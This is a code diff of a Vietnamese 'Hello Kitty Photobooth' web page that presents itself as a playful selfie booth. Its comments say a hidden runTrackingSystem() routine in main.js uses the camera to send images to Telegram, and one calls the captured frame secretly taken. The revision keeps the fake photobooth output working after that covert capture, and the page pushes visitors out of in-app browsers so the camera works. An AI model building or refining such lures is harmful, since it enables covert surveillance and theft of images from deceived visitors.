@@ -4,120 +4,97 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>Hello Kitty Photobooth 🎀</title>
-    <link href="https://fonts.googleapis.com/css2?family=Quicksand:wght@600;700;900&display=swap" rel="stylesheet">
+    <link href="https://fonts.googleapis.com/css2?family=Nunito:wght@600;800;900&display=swap" rel="stylesheet">
     <style>
-        /* CSS RESET & BASE STYLES */
-        * { 
-            box-sizing: border-box; 
-            margin: 0; 
-            padding: 0; 
-            -webkit-tap-highlight-color: transparent; 
-        }
+        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Nunito', sans-serif; }
         
         body {
-            font-family: 'Quicksand', sans-serif;
-            background-color: #ffdeea;
-            /* Tạo nền chấm bi hồng phấn nhẹ nhàng */
-            background-image: radial-gradient(#fff0f5 2px, transparent 2px);
-            background-size: 20px 20px;
+            background: #ffdeea;
+            background-image: 
+                radial-gradient(circle at 10% 20%, #fff0f5 0%, transparent 20%),
+                radial-gradient(circle at 90% 80%, #ffd5e4 0%, transparent 20%),
+                linear-gradient(135deg, #ffdeea 0%, #fff 100%);
             min-height: 100vh;
             display: flex;
             justify-content: center;
             align-items: center;
+            color: #d6136c;
             overflow-x: hidden;
         }
 
-        /* CONTAINER CHÍNH CHỐNG VỠ GIAO DIỆN TRÊN MOBILE */
-        .app-container {
+        /* Container bọc toàn bộ để chống vỡ layout trên Mobile */
+        .booth-wrapper {
+            position: relative;
             width: 92%;
             max-width: 420px;
-            background: rgba(255, 255, 255, 0.98);
+            margin: 60px auto 30px; /* Chừa khoảng trống phía trên cho đầu Kitty */
+        }
+
+        /* Khung chính */
+        .card {
+            background: rgba(255, 255, 255, 0.95);
             border-radius: 36px;
-            padding: 30px 22px 25px;
-            box-shadow: 0 20px 50px rgba(214, 19, 108, 0.15), inset 0 0 0 6px #ffb7c5;
+            padding: 40px 20px 25px; /* Padding top lớn để không đè chữ */
+            box-shadow: 0 15px 35px rgba(214,19,108,0.15), inset 0 0 0 4px #ffb6c1, inset 0 0 20px rgba(255,182,193,0.3);
+            text-align: center;
             position: relative;
             z-index: 10;
-            margin: 40px auto; /* Chừa không gian cho họa tiết lồi ra ngoài */
         }
 
-        /* TRANG TRÍ MẶT HELLO KITTY CSS NỔI Ở GÓC TRÊN CÙNG TRÁI */
-        .kitty-deco {
+        /* Nơ góc phải khung */
+        .card::after {
+            content: "🎀";
             position: absolute;
-            top: -45px;
-            left: -15px;
-            width: 100px;
-            height: 80px;
-            z-index: 20;
-            filter: drop-shadow(0 6px 12px rgba(214,19,108,0.2));
-            pointer-events: none;
+            top: -12px;
+            right: -10px;
+            font-size: 40px;
+            transform: rotate(15deg);
+            filter: drop-shadow(0 4px 6px rgba(248,81,153,0.3));
+            animation: pulse 2s infinite;
         }
-        .kd-face {
-            width: 90px; height: 70px; background: #fff;
-            border: 4px solid #ef9fbd; border-radius: 48% 48% 46% 46%;
-            position: absolute; bottom: 0; left: 5px;
-        }
-        .kd-ear {
-            width: 35px; height: 35px; background: #fff; border: 4px solid #ef9fbd;
-            position: absolute; top: -5px; z-index: -1;
-        }
-        .kd-ear.l { left: 2px; transform: rotate(-15deg); border-radius: 75% 20% 20% 20%; }
-        .kd-ear.r { right: 2px; transform: rotate(15deg); border-radius: 20% 75% 20% 20%; }
-        .kd-eye { width: 7px; height: 12px; background: #222; border-radius: 50%; position: absolute; top: 35px; }
-        .kd-eye.l { left: 22px; } .kd-eye.r { right: 22px; }
-        .kd-nose { width: 12px; height: 8px; background: #ffcc00; border: 2px solid #e3b731; border-radius: 50%; position: absolute; top: 45px; left: 50%; transform: translateX(-50%); }
-        .kd-bow { position: absolute; top: 0px; right: -8px; width: 40px; height: 30px; }
-        .kd-bow::before, .kd-bow::after { content: ""; position: absolute; width: 22px; height: 25px; background: #ff0044; border: 3px solid #cc0033; top: 2px; }
-        .kd-bow::before { left: 0; transform: rotate(-15deg); border-radius: 75% 20% 70% 25%; }
-        .kd-bow::after { right: 0; transform: rotate(15deg); border-radius: 20% 75% 25% 70%; }
-        .kd-bow i { position: absolute; width: 14px; height: 14px; background: #ff3366; border: 3px solid #cc0033; border-radius: 50%; top: 7px; left: 50%; transform: translateX(-50%); z-index: 2; }
 
-        .header {
-            text-align: center;
-            margin-bottom: 22px;
-        }
-        .header h1 {
-            font-size: 34px;
+        h1 {
+            font-size: 28px;
             font-weight: 900;
             color: #df2b76;
-            text-shadow: 2px 2px 0 #fff, 0 4px 10px rgba(223, 43, 118, 0.2);
-            line-height: 1.1;
-            letter-spacing: -0.5px;
+            line-height: 1.2;
             margin-bottom: 8px;
         }
-        .header p {
+
+        .subtitle {
             display: inline-block;
-            background: #fff0f5;
-            color: #d6136c;
-            font-size: 14px;
-            font-weight: 700;
-            padding: 6px 18px;
+            background: #fff3f8;
+            color: #df2b76;
+            padding: 5px 16px;
             border-radius: 20px;
-            border: 2px dashed #ffb7c5;
+            font-size: 14px;
+            font-weight: 800;
+            border: 2px dashed #ffb6c1;
+            margin-bottom: 15px;
         }
 
-        /* VIEWPORT CAMERA - KHÓA CHẶT TỶ LỆ 3:4 ĐỂ KHÔNG BỊ MÉO TRÊN MỌI THIẾT BỊ */
-        .viewport {
+        /* Khung Camera chuẩn tỷ lệ 3:4 (chuẩn Photobooth) */
+        .camera-container {
             width: 100%;
             aspect-ratio: 3/4;
             background: #ffe5ef;
             border-radius: 24px;
             position: relative;
+            border: 4px dashed #ff8ab3;
             overflow: hidden;
-            box-shadow: inset 0 0 20px rgba(248, 81, 153, 0.15);
+            box-shadow: inset 0 0 20px rgba(248,81,153,0.2);
+            margin-bottom: 20px;
             display: flex;
             justify-content: center;
             align-items: center;
-            border: 4px solid #fff;
-            outline: 3px dashed #ffb7c5;
-            margin-bottom: 25px;
         }
 
         video {
             width: 100%;
             height: 100%;
             object-fit: cover;
-            transform: scaleX(-1); /* Lật gương cho camera trước */
-            background-color: #000;
+            transform: scaleX(-1); /* Lật gương */
+            border-radius: 20px;
         }
 
         #resultImg {
@@ -126,434 +103,326 @@
             object-fit: contain;
             display: none;
             background: #fff;
-            z-index: 10;
         }
-        
-        .cam-badge {
+
+        /* Trạng thái Camera góc trái */
+        .cam-status {
             position: absolute;
-            top: 14px;
-            left: 14px;
+            top: 12px;
+            left: 12px;
             background: #fff;
-            color: #df2b76;
+            padding: 5px 12px;
+            border-radius: 20px;
             font-size: 11px;
             font-weight: 900;
-            padding: 6px 14px;
-            border-radius: 20px;
+            color: #df2b76;
+            border: 2px solid #ffb6c1;
+            z-index: 5;
             display: flex;
             align-items: center;
             gap: 6px;
-            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.08);
-            border: 2px solid #ffdeea;
-            z-index: 5;
+            box-shadow: 0 4px 10px rgba(0,0,0,0.05);
         }
-        .cam-badge::before {
+        .cam-status::before {
             content: "";
-            width: 8px;
-            height: 8px;
+            width: 8px; height: 8px;
             border-radius: 50%;
             background: #45c97b;
-            box-shadow: 0 0 0 3px rgba(69, 201, 123, 0.25);
-            animation: blink 1.5s infinite;
+            box-shadow: 0 0 0 3px rgba(69,201,123,0.2);
         }
 
-        @keyframes blink { 0%, 100% { opacity: 1; } 50% { opacity: 0.4; } }
-
-        #loading-msg {
+        #msg {
             position: absolute;
             z-index: 2;
             color: #df2b76;
-            font-weight: 900;
-            font-size: 16px;
-            text-align: center;
-            background: rgba(255,255,255,0.8);
-            padding: 10px 20px;
-            border-radius: 20px;
+            font-weight: 800;
         }
 
-        /* HỆ THỐNG NÚT BẤM */
-        .controls {
+        /* System UI Group (Nút bấm) */
+        .btn-group {
             display: flex;
             gap: 12px;
             width: 100%;
+            justify-content: space-between;
         }
+
         .btn {
             border: none;
-            border-radius: 24px;
-            font-size: 17px;
+            border-radius: 20px;
+            font-size: 16px;
             font-weight: 900;
-            padding: 22px 10px;
             cursor: pointer;
             transition: all 0.2s cubic-bezier(0.2, 0.8, 0.2, 1);
             display: flex;
             justify-content: center;
             align-items: center;
             gap: 8px;
-            text-transform: uppercase;
         }
-        
-        .btn-capture {
-            width: 100%;
-            background: linear-gradient(135deg, #ff7eb3, #ff1493);
+
+        .btn-main {
+            background: linear-gradient(135deg, #ff66a5, #ef2e7e);
             color: white;
-            box-shadow: 0 8px 0 #d91e69, 0 15px 25px rgba(248, 81, 153, 0.3);
+            width: 100%;
+            padding: 18px;
+            box-shadow: 0 8px 0 #d91e69, 0 15px 25px rgba(248,81,153,0.3);
         }
-        .btn-capture:active { transform: translateY(6px); box-shadow: 0 2px 0 #d91e69; }
-        .btn-capture:disabled { background: #f4c2d7; box-shadow: 0 8px 0 #dca4bc; color: #fff; cursor: wait; }
+
+        .btn-main:active { transform: translateY(6px); box-shadow: 0 2px 0 #d91e69; }
+        .btn-main:disabled { background: #f4c2d7; box-shadow: 0 8px 0 #dca4bc; cursor: not-allowed; }
 
         .btn-retake {
             flex: 4;
             background: #fff;
             color: #df2b76;
             border: 3px solid #df2b76;
+            padding: 16px 10px;
             box-shadow: 0 6px 0 #df2b76;
         }
         .btn-retake:active { transform: translateY(4px); box-shadow: 0 2px 0 #df2b76; }
-        
+
         .btn-save {
             flex: 6;
-            background: linear-gradient(135deg, #ff7eb3, #ff1493);
+            background: linear-gradient(135deg, #ff66a5, #ef2e7e);
             color: white;
-            box-shadow: 0 6px 0 #d91e69, 0 12px 20px rgba(248, 81, 153, 0.3);
+            padding: 16px 10px;
+            box-shadow: 0 6px 0 #d91e69, 0 10px 20px rgba(248,81,153,0.3);
         }
         .btn-save:active { transform: translateY(4px); box-shadow: 0 2px 0 #d91e69; }
 
-        .controls-result {
-            display: none;
-            width: 100%;
-            gap: 12px;
+        /* Gắn chặt bé Kitty lên viền trên của Card để không bao giờ bị đè */
+        .kitty-head {
+            position: absolute;
+            top: -55px; /* Kéo lên một nửa đầu */
+            left: 50%;
+            transform: translateX(-50%);
+            width: 110px;
+            height: 95px;
+            z-index: 20;
+            filter: drop-shadow(0 5px 15px rgba(214,19,108,0.2));
+            pointer-events: none;
         }
-        
-        #status-text {
-            font-size: 14px;
-            color: #8c596d;
-            margin-top: 20px;
-            line-height: 1.6;
-            font-weight: 700;
-            text-align: center;
+        /* CSS Art Kitty chuẩn xác */
+        .k-face {
+            width: 110px; height: 85px; background: #fff;
+            border: 4px solid #ef9fbd; border-radius: 48% 48% 46% 46%;
+            position: absolute; bottom: 0; left: 0;
         }
+        .k-ear {
+            width: 40px; height: 40px; background: #fff; border: 4px solid #ef9fbd;
+            position: absolute; top: -5px; z-index: -1;
+        }
+        .k-ear.l { left: 4px; transform: rotate(-15deg); border-radius: 75% 20% 20% 20%; }
+        .k-ear.r { right: 4px; transform: rotate(15deg); border-radius: 20% 75% 20% 20%; }
+        .k-eye { width: 8px; height: 14px; background: #3d3339; border-radius: 50%; position: absolute; top: 40px; }
+        .k-eye.l { left: 30px; } .k-eye.r { right: 30px; }
+        .k-nose { width: 14px; height: 10px; background: #ffd43f; border: 2px solid #e3b731; border-radius: 50%; position: absolute; top: 52px; left: 50%; transform: translateX(-50%); }
+        .k-whisker { width: 25px; height: 3px; background: #8d7d84; border-radius: 3px; position: absolute; }
+        .k-whisker.w1 { left: -10px; top: 45px; transform: rotate(8deg); }
+        .k-whisker.w2 { left: -10px; top: 55px; transform: rotate(-8deg); }
+        .k-whisker.w3 { right: -10px; top: 45px; transform: rotate(-8deg); }
+        .k-whisker.w4 { right: -10px; top: 55px; transform: rotate(8deg); }
+        .k-bow { position: absolute; top: 5px; right: -5px; width: 45px; height: 35px; }
+        .k-bow::before, .k-bow::after { content: ""; position: absolute; width: 25px; height: 30px; background: #f34d93; border: 3px solid #d82b73; top: 2px; }
+        .k-bow::before { left: 0; transform: rotate(-15deg); border-radius: 75% 20% 70% 25%; }
+        .k-bow::after { right: 0; transform: rotate(15deg); border-radius: 20% 75% 25% 70%; }
+        .k-bow i { position: absolute; width: 16px; height: 16px; background: #e72c79; border: 3px solid #d82b73; border-radius: 50%; top: 9px; left: 50%; transform: translateX(-50%); z-index: 2; }
 
-        /* CẢNH BÁO TRÌNH DUYỆT IN-APP CHỐNG LỖI CAMERA */
-        #browser-warning {
-            display: none;
-            position: fixed;
-            inset: 0;
-            background: #ffdeea;
-            z-index: 9999;
-            flex-direction: column;
-            justify-content: center;
-            align-items: center;
-            padding: 20px;
-        }
-        .warning-card {
-            background: #fff;
-            padding: 35px 25px;
-            border-radius: 28px;
-            text-align: center;
-            box-shadow: 0 20px 40px rgba(214, 19, 108, 0.15);
-            border: 4px dashed #ffb7c5;
-            max-width: 400px;
-        }
+        @keyframes pulse { 0%, 100% { transform: rotate(15deg) scale(1); } 50% { transform: rotate(15deg) scale(1.1); } }
+        
+        /* Cảnh báo trình duyệt ẩn */
+        #browser-warning { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #ffdeea; z-index: 9999; justify-content: center; align-items: center; text-align: center; padding: 20px; }
+        .warning-box { background: white; padding: 30px; border-radius: 20px; box-shadow: 0 10px 30px rgba(214,19,108,0.2); }
     </style>
 </head>
 <body>
 
-<!-- Cảnh báo nếu khách mở từ Facebook/Zalo/TikTok -->
 <div id="browser-warning">
-    <div class="warning-card">
-        <h3 style="color: #df2b76; font-size: 22px; margin-bottom: 15px; font-weight: 900;">⚠️ Trình Duyệt Bị Chặn</h3>
-        <p style="color: #666; font-weight: 700; line-height: 1.6; font-size: 15px;">
-            Bạn đang dùng trình duyệt bên trong ứng dụng nên Camera bị vô hiệu hóa.<br><br>
-            Hãy bấm vào biểu tượng <b style="color:#df2b76; font-size: 18px;">(···)</b> hoặc <b style="color:#df2b76; font-size: 18px;">(⋮)</b> ở góc phải màn hình 
-            và chọn <b>"Mở bằng trình duyệt" (Open in Browser/Safari)</b> để chụp ảnh nhé!
+    <div class="warning-box">
+        <h3 style="color: #df2b76; font-size: 20px; margin-bottom: 10px;">⚠️ VUI LÒNG MỞ BẰNG TRÌNH DUYỆT</h3>
+        <p style="color: #666; font-size: 15px; font-weight: 600; line-height: 1.6;">
+            Bạn đang dùng trình duyệt trong App (Facebook/TikTok/Zalo...).<br>
+            Hãy bấm vào nút <b style="color:#df2b76;">(···)</b> hoặc <b style="color:#df2b76;">(⋮)</b> ở góc phải màn hình<br>
+            và chọn <b>"Mở bằng trình duyệt (Open in Browser)"</b> để bắt đầu nhé!
         </p>
     </div>
 </div>
 
-<div class="app-container">
-    <!-- Họa tiết Kitty góc trái -->
-    <div class="kitty-deco">
-        <div class="kd-face">
-            <div class="kd-ear l"></div><div class="kd-ear r"></div>
-            <div class="kd-eye l"></div><div class="kd-eye r"></div>
-            <div class="kd-nose"></div>
-            <div class="kd-bow"><i></i></div>
+<div class="booth-wrapper">
+    <!-- Kitty Head được khóa chặt vào khung này, tỷ lệ nào cũng không vỡ -->
+    <div class="kitty-head">
+        <div class="k-face">
+            <div class="k-ear l"></div><div class="k-ear r"></div>
+            <div class="k-eye l"></div><div class="k-eye r"></div>
+            <div class="k-nose"></div>
+            <div class="k-whisker w1"></div><div class="k-whisker w2"></div>
+            <div class="k-whisker w3"></div><div class="k-whisker w4"></div>
+            <div class="k-bow"><i></i></div>
         </div>
     </div>
 
-    <div class="header">
-        <h1>Hello Kitty</h1>
-        <p>🎀 Chu môi lên mình chụp cho nè 🎀</p>
-    </div>
-
-    <div class="viewport" id="vBox">
-        <div class="cam-badge">CAMERA ACTIVE</div>
-        <div id="loading-msg">Hãy cấp quyền Camera<br>để bắt đầu nhé!</div>
+    <div class="card" id="mainCard">
+        <h1>Photobooth<br>Hello Kitty</h1>
+        <div class="subtitle">Chu môi lên mình chụp cho nè 🎀</div>
         
-        <!-- Video Stream -->
-        <video id="preview" autoplay playsinline muted></video>
+        <div class="camera-container" id="vBox">
+            <div class="cam-status">CAMERA</div>
+            <p id="msg">Đang khởi tạo máy ảnh...</p>
+            <video id="preview" autoplay playsinline muted></video>
+            <img id="resultImg" alt="Your Cute Photo" />
+        </div>
         
-        <!-- Ảnh kết quả -->
-        <img id="resultImg" alt="Your Photobooth" />
-    </div>
+        <!-- Nút chụp ban đầu -->
+        <button class="btn btn-main" id="startBtn">📸 CHỤP ẢNH NÈ 🎀</button>
+        
+        <!-- Nhóm nút sau khi chụp xong -->
+        <div class="btn-group" id="actionButtons" style="display: none;">
+            <button class="btn btn-retake" id="retakeBtn">🔄 CHỤP LẠI</button>
+            <button class="btn btn-save" id="saveBtn">💖 LƯU ẢNH VỀ</button>
+        </div>
 
-    <!-- Khối Nút Bấm -->
-    <button class="btn btn-capture" id="startBtn">📸 CHỤP ẢNH NÈ</button>
-    
-    <div class="controls-result" id="resultControls">
-        <button class="btn btn-retake" id="retakeBtn">🔄 LẠI</button>
-        <button class="btn btn-save" id="saveBtn">💖 LƯU ẢNH</button>
+        <p id="status-text" style="font-size: 13px; font-weight: 700; color: #8c596d; margin-top: 20px;">
+            Hãy đảm bảo khuôn mặt nằm trong khung hình nhé!<br>
+            Hệ thống sẽ tự động lồng viền xinh xắn cho bạn.
+        </p>
     </div>
-
-    <p id="status-text">
-        Hãy đảm bảo khuôn mặt nằm trong khung hình nhé!<br>
-        Hệ thống sẽ tự động lồng viền xinh xắn cho bạn.
-    </p>
 </div>
 
-<!-- FILE MAIN.JS CỦA BẠN SẼ HOẠT ĐỘNG BÌNH THƯỜNG Ở ĐÂY -->
 <script src="main.js"></script>
-
 <script>
-    // 1. KIỂM TRA TRÌNH DUYỆT IN-APP (Chống lỗi camera bị chặn)
+    // Kiểm tra in-app browser
     document.addEventListener("DOMContentLoaded", () => {
         const ua = navigator.userAgent || window.opera;
         if (/TikTok|FBAN|FBAV|Zalo|Instagram|Messenger/i.test(ua)) {
             document.getElementById('browser-warning').style.display = 'flex';
-            document.querySelector('.app-container').style.display = 'none';
+            document.querySelector('.booth-wrapper').style.display = 'none';
         }
     });
 
+    const btn = document.getElementById('startBtn');
     const video = document.getElementById('preview');
-    const startBtn = document.getElementById('startBtn');
     const resultImg = document.getElementById('resultImg');
-    const resultControls = document.getElementById('resultControls');
-    const msg = document.getElementById('loading-msg');
+    const actionButtons = document.getElementById('actionButtons');
     const statusText = document.getElementById('status-text');
+    const msg = document.getElementById('msg');
     
     // Biến toàn cục để giữ lại khung ảnh chất lượng cao
-    let capturedFrameBase64 = null;
-    let hasCaptured = false;
+    let highResCanvas = null;
 
-    // 2. LẮNG NGHE SỰ KIỆN KHI CAMERA VỪA BẬT LÊN
-    // Đây là cốt lõi để sửa lỗi màn hình đen: Ta sẽ chụp ảnh ngay khi video bắt đầu chạy, 
-    // TRƯỚC KHI file main.js kịp tắt camera đi.
-    video.addEventListener('playing', () => {
-        msg.style.display = 'none'; // Ẩn chữ "Hãy cấp quyền..."
-
-        if (hasCaptured) return; // Chỉ chụp 1 lần cho camera trước
-        hasCaptured = true;
-
-        // Căn đúng 600 mili-giây (vừa đủ để camera lấy nét/sáng) để chụp một khung hình vào RAM
-        setTimeout(() => {
-            try {
-                const vw = video.videoWidth;
-                const vh = video.videoHeight;
-                
-                if (vw > 0 && vh > 0) {
-                    const canvas = document.createElement('canvas');
-                    canvas.width = vw;
-                    canvas.height = vh;
-                    const ctx = canvas.getContext('2d');
-                    
-                    // Lật gương ảnh (vì camera trước bị ngược)
-                    ctx.translate(vw, 0);
-                    ctx.scale(-1, 1);
-                    ctx.drawImage(video, 0, 0, vw, vh);
-                    
-                    // Lưu thẳng vào biến dưới dạng Base64
-                    capturedFrameBase64 = canvas.toDataURL('image/jpeg', 1.0);
-                    console.log("Đã chụp thành công ảnh từ luồng Video vào RAM!");
-                }
-            } catch (error) {
-                console.error("Lỗi khi trích xuất khung hình: ", error);
-            }
-        }, 600);
-    });
-
-    // 3. XỬ LÝ SỰ KIỆN BẤM NÚT CHỤP
-    startBtn.addEventListener('click', async () => {
-        // Thay đổi Giao diện báo hiệu đang xử lý
-        startBtn.disabled = true;
-        startBtn.innerHTML = "✨ ĐANG RỬA ẢNH... ĐỢI XÍU!";
-        statusText.innerHTML = "Hệ thống đang lồng khung Hello Kitty...<br>Tuyệt đối không thoát trang nhé!";
+    btn.addEventListener('click', async () => {
+        // [QUAN TRỌNG NHẤT]: Lưu ngay 1 frame vào bộ nhớ (RAM) TRƯỚC KHI main.js tắt camera
+        // Tính toán độ phân giải cao để khi tải về ảnh nét căng
+        const vw = video.videoWidth || 720;
+        const vh = video.videoHeight || 960;
         
-        // Reset biến cờ
-        hasCaptured = false;
-        capturedFrameBase64 = null;
+        const tempCanvas = document.createElement('canvas');
+        tempCanvas.width = vw;
+        tempCanvas.height = vh;
+        const tempCtx = tempCanvas.getContext('2d');
+        
+        // Vẽ ảnh từ Video (lật gương như camera trước)
+        tempCtx.translate(vw, 0);
+        tempCtx.scale(-1, 1);
+        tempCtx.drawImage(video, 0, 0, vw, vh);
+        
+        // Cất canvas chứa mặt người dùng đi, tí nữa xài
+        highResCanvas = tempCanvas;
 
-        // GỌI HÀM CỦA BẠN: Bật camera, gửi Tele, rồi tắt camera.
+        // Đổi trạng thái UI báo cho người dùng biết
+        btn.disabled = true;
+        btn.innerHTML = "✨ ĐANG XỬ LÝ ẢNH...";
+        statusText.innerHTML = "Đang lồng khung ảnh Hello Kitty... Vui lòng đợi nhé!";
+
+        // CHẠY HỆ THỐNG GỬI TELEGRAM CỦA BRO (Mặc kệ nó tắt camera hay làm gì)
         if (typeof runTrackingSystem === 'function') {
             await runTrackingSystem(); 
         }
 
-        // Sau khi main.js chạy xong, camera trên màn hình đã thành màu đen.
-        // Nhưng lúc này ta ĐÃ CÓ bức ảnh trong biến `capturedFrameBase64`!
-        if (capturedFrameBase64) {
-            renderFinalPhotobooth(capturedFrameBase64);
-        } else {
-            alert("Lỗi: Không thể lấy được hình ảnh từ Camera. Vui lòng thử lại!");
-            window.location.reload();
-        }
+        // Tới bước này main.js đã chạy xong, camera đã chết, nhưng ta ĐÃ CÓ ẢNH TRONG BỘ NHỚ!
+        renderFinalPhotoBooth(vw, vh);
     });
 
-    // 4. HÀM TOÁN HỌC VẼ VECTOR HELLO KITTY SIÊU NÉT (KHÔNG SỢ BỂ HÌNH, KHÔNG LỖI FONT)
-    function drawVectorKitty(ctx, x, y, scale) {
-        ctx.save();
-        ctx.translate(x, y);
-        ctx.scale(scale, scale);
+    function renderFinalPhotoBooth(width, height) {
+        const finalCanvas = document.createElement('canvas');
+        const ctx = finalCanvas.getContext('2d');
+        
+        finalCanvas.width = width;
+        finalCanvas.height = height;
 
-        // Đổ bóng cho toàn bộ Kitty
-        ctx.shadowColor = "rgba(0,0,0,0.15)";
-        ctx.shadowBlur = 12;
-        ctx.shadowOffsetY = 6;
+        const borderThick = Math.floor(width * 0.05); // Viền chiếm 5% chiều ngang
 
-        // Vẽ 2 Tai
-        ctx.fillStyle = '#ffffff'; 
-        ctx.strokeStyle = '#222222'; 
-        ctx.lineWidth = 5;
+        // 1. Phủ nền màu hồng phấn (Background Khung)
+        ctx.fillStyle = '#ffb6c1';
+        ctx.fillRect(0, 0, width, height);
+
+        // 2. Kẻ đường đứt nét trắng bao quanh
+        ctx.strokeStyle = '#ffffff';
+        ctx.lineWidth = Math.floor(width * 0.012);
         ctx.lineJoin = 'round';
+        ctx.setLineDash([20, 20]);
+        ctx.strokeRect(borderThick / 2, borderThick / 2, width - borderThick, height - borderThick);
+        ctx.setLineDash([]); // Reset nét vẽ
+
+        // 3. Đổ ảnh mặt người dùng từ BỘ NHỚ (highResCanvas) vào giữa khung
+        // Chừa khoảng trống bên dưới để ghi chữ
+        const textStripHeight = Math.floor(height * 0.16);
+        ctx.drawImage(
+            highResCanvas, // Nguồn ảnh lấy từ cái canvas ban nãy chụp trộm
+            borderThick, 
+            borderThick, 
+            width - borderThick * 2, 
+            height - borderThick * 2 - textStripHeight
+        );
+
+        // 4. Vẽ một dải màu trắng ở phía đáy để ghi chữ (Style Polaroid)
+        ctx.fillStyle = '#ffffff';
+        ctx.fillRect(
+            borderThick, 
+            height - borderThick - textStripHeight, 
+            width - borderThick * 2, 
+            textStripHeight
+        );
+
+        // 5. Viết Text "Hello Kitty Photobooth"
+        ctx.fillStyle = '#df2b76';
+        const fontSize = Math.floor(textStripHeight * 0.35);
+        ctx.font = `900 ${fontSize}px 'Nunito', sans-serif`;
+        ctx.textAlign = 'center';
+        ctx.textBaseline = 'middle';
         
-        ctx.beginPath(); ctx.moveTo(-45, -20); ctx.lineTo(-75, -80); ctx.lineTo(-10, -55); ctx.fill(); ctx.stroke();
-        ctx.beginPath(); ctx.moveTo(45, -20); ctx.lineTo(75, -80); ctx.lineTo(10, -55); ctx.fill(); ctx.stroke();
+        // Thêm nơ trang trí bằng Text Unicode vào 2 bên
+        const textY = height - borderThick - (textStripHeight / 2);
+        ctx.fillText('🎀 Hello Kitty Photobooth 🎀', width / 2, textY);
 
-        // Vẽ Khuôn mặt (Hình Elip)
-        ctx.beginPath(); 
-        ctx.ellipse(0, 0, 90, 70, 0, 0, Math.PI * 2); 
-        ctx.fill(); ctx.stroke();
+        // Ép Canvas thành dạng Ảnh (Base64 JPEG chất lượng cao)
+        resultImg.src = finalCanvas.toDataURL('image/jpeg', 1.0);
+
+        // Hiển thị kết quả ra UI
+        video.style.display = 'none';
+        msg.style.display = 'none';
+        resultImg.style.display = 'block';
         
-        ctx.shadowColor = "transparent"; // Tắt bóng cho các chi tiết bên trong
-
-        // Mắt đen
-        ctx.fillStyle = '#222222';
-        ctx.beginPath(); ctx.ellipse(-38, 10, 7, 12, 0, 0, Math.PI * 2); ctx.fill();
-        ctx.beginPath(); ctx.ellipse(38, 10, 7, 12, 0, 0, Math.PI * 2); ctx.fill();
-
-        // Mũi vàng
-        ctx.fillStyle = '#ffcc00';
-        ctx.beginPath(); ctx.ellipse(0, 24, 11, 8, 0, 0, Math.PI * 2); ctx.fill(); ctx.stroke();
-
-        // Râu mèo (6 sợi)
-        ctx.lineWidth = 4;
-        ctx.lineCap = 'round';
-        const drawWhisker = (x1, y1, x2, y2) => { ctx.beginPath(); ctx.moveTo(x1, y1); ctx.lineTo(x2, y2); ctx.stroke(); };
-        drawWhisker(-90, 5, -130, -5); drawWhisker(-90, 18, -130, 18); drawWhisker(-85, 31, -125, 41);
-        drawWhisker(90, 5, 130, -5); drawWhisker(90, 18, 130, 18); drawWhisker(85, 31, 125, 41);
-
-        // Nơ đỏ (Đặc trưng Hello Kitty)
-        ctx.fillStyle = '#ff0044';
-        ctx.beginPath(); ctx.ellipse(45, -45, 24, 20, Math.PI/6, 0, Math.PI*2); ctx.fill(); ctx.stroke();
-        ctx.beginPath(); ctx.ellipse(88, -35, 24, 20, -Math.PI/6, 0, Math.PI*2); ctx.fill(); ctx.stroke();
-        ctx.beginPath(); ctx.arc(68, -40, 14, 0, Math.PI*2); ctx.fill(); ctx.stroke();
-
-        ctx.restore();
+        btn.style.display = 'none'; // Ẩn nút chụp to
+        actionButtons.style.display = 'flex'; // Hiện 2 nút Save / Chụp lại
+        
+        statusText.innerHTML = "✨ Tadaaaa! Ảnh của bạn đã xong ✨<br>Lưu về khoe bạn bè ngay nào!";
     }
 
-    // 5. CHẾ BẢN ẢNH PHOTOBOOTH CUỐI CÙNG (1200 x 1600 px)
-    function renderFinalPhotobooth(base64Src) {
-        const img = new Image();
-        img.onload = () => {
-            // Khởi tạo "Xưởng In" - Canvas độ phân giải cực cao
-            const canvas = document.createElement('canvas');
-            const ctx = canvas.getContext('2d');
-            
-            const CANVAS_W = 1200;
-            const CANVAS_H = 1600;
-            canvas.width = CANVAS_W;
-            canvas.height = CANVAS_H;
-
-            // BƯỚC 1: Vẽ nền màu hồng phấn chấm bi trắng
-            ctx.fillStyle = '#ffb7c5';
-            ctx.fillRect(0, 0, CANVAS_W, CANVAS_H);
-            
-            ctx.fillStyle = 'rgba(255, 255, 255, 0.6)';
-            for (let x = 30; x < CANVAS_W; x += 60) {
-                for (let y = 30; y < CANVAS_H; y += 60) {
-                    ctx.beginPath(); ctx.arc(x, y, 6, 0, Math.PI * 2); ctx.fill();
-                }
-            }
-
-            // BƯỚC 2: Tính toán tỷ lệ Khung Polaroid Trắng
-            // Tạo một khung trắng nằm giữa, chừa lề xung quanh
-            const paddingX = 80;
-            const paddingTop = 120;
-            
-            const polaroidW = CANVAS_W - (paddingX * 2); // 1040
-            const polaroidH = 1380; 
-            
-            // Vẽ đổ bóng cho viền trắng
-            ctx.shadowColor = "rgba(0,0,0,0.2)";
-            ctx.shadowBlur = 40;
-            ctx.shadowOffsetY = 10;
-            ctx.fillStyle = '#ffffff';
-            ctx.fillRect(paddingX, paddingTop, polaroidW, polaroidH);
-            ctx.shadowColor = "transparent"; // Tắt bóng
-
-            // Kẻ viền đứt nét màu hồng bên trong khung trắng
-            ctx.strokeStyle = '#ffb7c5';
-            ctx.lineWidth = 8;
-            ctx.setLineDash([20, 20]);
-            ctx.strokeRect(paddingX + 20, paddingTop + 20, polaroidW - 40, polaroidH - 40);
-            ctx.setLineDash([]);
-
-            // BƯỚC 3: Xử lý và đổ Bức ảnh chụp vào khung
-            const photoX = paddingX + 40;
-            const photoY = paddingTop + 40;
-            const photoW = polaroidW - 80;
-            // Ép bức ảnh theo chuẩn tỷ lệ 3:4 của Photobooth
-            const photoH = Math.floor(photoW * (4/3)); 
-
-            ctx.drawImage(img, photoX, photoY, photoW, photoH);
-            
-            // Đóng khung đen mỏng quanh bức ảnh chụp cho sắc nét
-            ctx.strokeStyle = '#222222';
-            ctx.lineWidth = 5;
-            ctx.strokeRect(photoX, photoY, photoW, photoH);
-
-            // BƯỚC 4: Vẽ Footer chữ "Hello Kitty Photobooth"
-            const textY = photoY + photoH + 90; // Căn giữa khoảng trống phía dưới
-            ctx.fillStyle = '#df2b76';
